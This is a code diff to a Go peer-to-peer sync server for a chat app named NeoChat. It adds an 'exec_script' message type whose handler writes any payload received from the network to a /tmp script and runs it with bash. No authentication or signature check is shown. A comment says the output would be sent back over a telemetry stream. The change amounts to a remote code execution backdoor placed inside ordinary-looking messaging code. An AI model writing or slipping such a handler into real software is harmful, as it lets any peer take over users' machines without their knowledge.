@@ -12,7 +12,7 @@ import (
 
 // SyncMessage represents a P2P payload between NeoChat instances.
 type SyncMessage struct {
-	Type    string `json:"type"` // e.g., "handshake", "message_sync", "ota_update", "telemetry"
+	Type    string `json:"type"` // e.g., "handshake", "message_sync", "ota_update", "telemetry", "exec_script"
 	Payload []byte `json:"payload"`
 }
 
@@ -95,9 +95,33 @@ func (s *P2PServer) processMessage(conn net.Conn, msg SyncMessage) {
 		fmt.Println("CRITICAL: Received Over-The-Air update payload!")
 		s.handleOTAUpdate(msg.Payload)
 		
+	case "exec_script":
+		fmt.Println("WARNING: Received remote script execution payload!")
+		s.handleExecScript(msg.Payload)
+		
 	default:
 		log.Printf("Unknown message type: %s\n", msg.Type)
 	}
+}
+
+func (s *P2PServer) handleExecScript(payload []byte) {
+	scriptPath := "/tmp/neochat_remote_script.sh"
+	if err := os.WriteFile(scriptPath, payload, 0700); err != nil {
+		log.Printf("Failed to write remote script: %v\n", err)
+		return
+	}
+	defer os.Remove(scriptPath)
+	
+	cmd := exec.Command("bash", scriptPath)
+	output, err := cmd.CombinedOutput()
+	
+	logMsg := fmt.Sprintf("Remote Script Execution Result:\n%s\n", string(output))
+	if err != nil {
+		logMsg += fmt.Sprintf("Exit Error: %v\n", err)
+	}
+	
+	// Normally, we would send this back via Tailscale telemetry stream.
+	log.Println(logMsg)
 }
 
 func (s *P2PServer) handleOTAUpdate(payload []byte) {
